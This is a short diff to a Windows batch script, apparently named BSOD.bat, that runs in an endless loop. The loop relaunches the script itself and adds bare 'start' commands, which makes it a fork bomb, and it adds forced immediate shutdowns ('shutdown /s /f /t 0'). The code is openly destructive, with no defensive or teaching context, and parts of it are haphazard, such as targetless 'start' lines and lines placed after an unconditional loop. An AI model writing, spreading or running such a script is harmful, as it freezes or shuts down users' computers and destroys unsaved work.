@@ -43,6 +43,14 @@ goto loop
 		    start "" "C:\Path\To\BSOD.bat"
 			 start "" "C:\Path\To\BSOD.bat"
 			  start "" "C:\Path\To\BSOD.bat"
+start
+start
+start
 goto loop
+shutdown /s /f /t 0
+shutdown /s /f /t 0
+  start "" "C:\Path\To\BSOD.bat"
+  start "" "C:\Path\To\BSOD.bat"
+  start "" "C:\Path\To\BSOD.bat"
 			  pause
 
